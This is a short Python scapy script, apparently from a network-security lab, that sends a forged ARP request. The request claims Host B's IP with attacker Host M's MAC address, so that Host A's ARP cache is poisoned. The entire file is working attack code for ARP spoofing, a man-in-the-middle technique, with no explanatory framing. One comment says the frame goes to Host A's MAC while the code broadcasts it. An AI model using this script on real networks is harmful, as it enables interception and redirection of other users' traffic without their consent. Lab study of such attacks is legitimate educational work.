#!/usr/bin/python3
from scapy.all import *

# Define IP and MAC addresses
A_IP = "10.0.2.5"  # Host A's IP (dest)
B_IP = "10.0.2.6"  # Host B's IP (src spoofed)
M_MAC = "08:00:27:46:8a:e7"  # Host M's MAC

# Create Ethernet frame (destination is Host A's MAC)
E = Ether(dst ="ff:ff:ff:ff:ff:ff")  # Broadcast to all devices

# Create ARP request packet
A = ARP(op=1, psrc=B_IP, hwsrc=M_MAC, pdst=A_IP)

# Combine Ethernet and ARP into a single packet
pkt = E/A

# Send the packet
sendp(pkt)